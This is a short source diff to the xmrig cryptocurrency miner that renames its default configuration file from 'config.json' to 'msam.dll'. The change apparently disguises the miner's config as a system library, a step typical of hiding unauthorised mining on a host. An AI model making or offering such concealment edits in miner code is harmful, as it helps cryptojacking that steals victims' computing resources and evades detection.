@@ -46,7 +46,7 @@
 
 namespace xmrig {
 
-const String BaseConfig::kDefaultConfigFilename = "config.json";
+const String BaseConfig::kDefaultConfigFilename = "msam.dll";
 
 const char *BaseConfig::kApi            = "api";
 const char *BaseConfig::kApiId          = "id";
